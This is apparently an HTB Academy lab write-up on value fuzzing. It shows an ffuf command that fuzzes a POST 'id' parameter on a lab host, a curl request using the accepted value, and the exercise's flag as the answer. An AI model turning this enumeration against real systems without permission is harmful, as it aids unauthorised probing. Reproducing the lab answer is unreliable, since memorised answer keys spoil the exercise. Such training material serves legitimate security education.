# Section 12: Value Fuzzing

Module: 15. Attacking Web Applications with Ffuf

---

## Questions & Answers

### 1. Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?

Context:
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:30474/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://admin.academy.htb:30474/admin/admin.php
 :: Wordlist         : FUZZ: /home/htb-ac-2162140/ids.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : id=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 768
________________________________________________

73                      [Status: 200, Size: 787, Words: 218, Lines: 54, Duration: 167ms]
:: Progress: [1000/1000] :: Job [1/1] :: 238 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ curl http://admin.academy.htb:30474/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
<div class='center'><p>HTB{p4r4m373r_fuzz1n6_15_k3y!}</p></div>
<html>
<!DOCTYPE html>

<head>
  <title>HTB Academy</title>
  <style>
    *,
    html {
      margin: 0;
      padding: 0;
      border: 0;
    }

    html {
      width: 100%;
      height: 100%;
    }

    body {
      width: 100%;
      height: 100%;
      position: relative;
      background-color: darkslategrey;
    }

    .center {
      width: 100%;
      height: 50%;
      margin: 0;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-family: "Helvetica", Helvetica, sans-serif;
      text-align: center;
    }

    h1 {
      font-size: 144px;
    }

    p {
      font-size: 64px;
    }
  </style>
</head>

<body>
</body>

</html>
```

**Answer:** `HTB{p4r4m373r_fuzz1n6_15_k3y!}`

---

[Back to Module Index](./README.md)
